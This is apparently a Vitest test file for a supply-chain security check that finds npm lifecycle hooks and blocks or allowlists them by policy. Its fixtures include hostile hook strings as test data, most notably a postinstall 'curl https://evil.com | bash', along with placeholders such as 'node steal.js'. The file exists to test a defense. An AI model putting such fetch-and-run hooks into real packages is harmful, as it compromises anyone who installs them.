import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { writeFileSync, mkdirSync, existsSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import {
  checkLifecycleHooks,
  extractLifecycleHooks,
} from '../src/supply-chain/hook-sandbox.js';
import type { SupplyChainPolicy } from '../src/types.js';

const FIXTURE_DIR = './test-hook-fixtures';
const NODE_MODULES = join(FIXTURE_DIR, 'node_modules');

function makePolicy(overrides?: Partial<SupplyChainPolicy>): SupplyChainPolicy {
  return {
    quarantineWindowHours: 24,
    preinstallHookPolicy: 'blocklist',
    preinstallHookAllowlist: [],
    behavioralDiff: { enabled: true, newEndpointBlockThreshold: 1, sensitivePathBlocklist: [] },
    exfilDomainBlocklist: [],
    trustedPublishers: [],
    lockfileAttestation: { required: true, algorithm: 'sha256' },
    ...overrides,
  };
}

function createPkg(name: string, pkgJson: object): void {
  const dir = join(NODE_MODULES, name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify(pkgJson));
}

describe('HookSandbox', () => {
  beforeEach(() => {
    mkdirSync(NODE_MODULES, { recursive: true });
  });

  afterEach(() => {
    if (existsSync(FIXTURE_DIR)) rmSync(FIXTURE_DIR, { recursive: true, force: true });
  });

  describe('extractLifecycleHooks', () => {
    it('extracts preinstall hooks', () => {
      createPkg('hook-pkg', {
        name: 'hook-pkg',
        scripts: { preinstall: 'node malicious.js', build: 'tsc' },
      });
      const result = extractLifecycleHooks(join(NODE_MODULES, 'hook-pkg', 'package.json'));
      expect(result).not.toBeNull();
      expect(result!.hooks).toHaveProperty('preinstall');
      expect(result!.hooks).not.toHaveProperty('build');
    });

    it('extracts postinstall hooks', () => {
      createPkg('post-hook', {
        name: 'post-hook',
        scripts: { postinstall: 'node setup.js' },
      });
      const result = extractLifecycleHooks(join(NODE_MODULES, 'post-hook', 'package.json'));
      expect(result!.hooks).toHaveProperty('postinstall');
    });

    it('returns empty hooks for no lifecycle scripts', () => {
      createPkg('clean', {
        name: 'clean',
        scripts: { build: 'tsc', test: 'vitest' },
      });
      const result = extractLifecycleHooks(join(NODE_MODULES, 'clean', 'package.json'));
      expect(result).not.toBeNull();
      expect(Object.keys(result!.hooks)).toHaveLength(0);
    });

    it('returns null for missing package.json', () => {
      expect(extractLifecycleHooks('/nonexistent/package.json')).toBeNull();
    });

    it('returns empty hooks for package with no scripts at all', () => {
      createPkg('no-scripts', { name: 'no-scripts', version: '1.0.0' });
      const result = extractLifecycleHooks(join(NODE_MODULES, 'no-scripts', 'package.json'));
      expect(result).not.toBeNull();
      expect(Object.keys(result!.hooks)).toHaveLength(0);
    });
  });

  describe('checkLifecycleHooks — blocklist mode', () => {
    it('blocks packages with preinstall hooks', () => {
      createPkg('evil', {
        name: 'evil',
        scripts: { preinstall: 'node steal.js' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'evil' }],
        makePolicy(),
      );
      expect(result.allowed).toBe(false);
      expect(result.blockedPackages).toContain('evil');
    });

    it('blocks packages with postinstall hooks', () => {
      createPkg('sneaky', {
        name: 'sneaky',
        scripts: { postinstall: 'curl https://evil.com | bash' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'sneaky' }],
        makePolicy(),
      );
      expect(result.allowed).toBe(false);
    });

    it('allows packages without hooks', () => {
      createPkg('safe', {
        name: 'safe',
        scripts: { build: 'tsc', test: 'vitest' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'safe' }],
        makePolicy(),
      );
      expect(result.allowed).toBe(true);
      expect(result.blockedPackages).toHaveLength(0);
    });

    it('allows allowlisted packages with hooks', () => {
      createPkg('allowed-hooks', {
        name: 'allowed-hooks',
        scripts: { postinstall: 'node compile-native.js' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'allowed-hooks' }],
        makePolicy({ preinstallHookAllowlist: ['allowed-hooks'] }),
      );
      expect(result.allowed).toBe(true);
      expect(result.alerts.some(a => a.check === 'hook_allowlisted')).toBe(true);
    });

    it('blocks non-allowlisted among mixed packages', () => {
      createPkg('ok-pkg', { name: 'ok-pkg', scripts: { build: 'tsc' } });
      createPkg('bad-pkg', {
        name: 'bad-pkg',
        scripts: { preinstall: 'node evil.js' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'ok-pkg' }, { name: 'bad-pkg' }],
        makePolicy(),
      );
      expect(result.allowed).toBe(false);
      expect(result.blockedPackages).toEqual(['bad-pkg']);
    });

    it('emits critical severity for blocked hooks', () => {
      createPkg('hook-critical', {
        name: 'hook-critical',
        scripts: { install: 'bash payload.sh' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'hook-critical' }],
        makePolicy(),
      );
      const blockAlert = result.alerts.find(a => a.check === 'lifecycle_hook_blocked');
      expect(blockAlert).toBeDefined();
      expect(blockAlert!.severity).toBe('critical');
    });
  });

  describe('checkLifecycleHooks — allowlist mode', () => {
    it('blocks non-allowlisted hooks in allowlist mode', () => {
      createPkg('not-listed', {
        name: 'not-listed',
        scripts: { preinstall: 'echo hi' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'not-listed' }],
        makePolicy({ preinstallHookPolicy: 'allowlist' }),
      );
      expect(result.allowed).toBe(false);
    });
  });

  describe('checkLifecycleHooks — sandbox mode (stub)', () => {
    it('emits warning for sandbox mode and falls through to blocking', () => {
      createPkg('sandboxed', {
        name: 'sandboxed',
        scripts: { preinstall: 'echo test' },
      });

      const result = checkLifecycleHooks(
        NODE_MODULES,
        [{ name: 'sandboxed' }],
        makePolicy({ preinstallHookPolicy: 'sandbox' }),
      );
      expect(result.alerts.some(a => a.check === 'hook_sandbox_stub')).toBe(true);
      expect(result.allowed).toBe(false);
    });
  });

  it('handles scoped package allowlist with version', () => {
    createPkg('@scope/pkg', {
      name: '@scope/pkg',
      version: '2.0.0',
      scripts: { postinstall: 'node native-build.js' },
    });

    const result = checkLifecycleHooks(
      NODE_MODULES,
      [{ name: '@scope/pkg', version: '2.0.0' }],
      makePolicy({ preinstallHookAllowlist: ['@scope/pkg@2.0.0'] }),
    );
    expect(result.allowed).toBe(true);
  });

  it('emits supply-chain source on all alerts', () => {
    createPkg('source-check', {
      name: 'source-check',
      scripts: { preinstall: 'echo evil' },
    });

    const result = checkLifecycleHooks(
      NODE_MODULES,
      [{ name: 'source-check' }],
      makePolicy(),
    );
    for (const alert of result.alerts) {
      expect(alert.source).toBe('supply-chain');
    }
  });
});
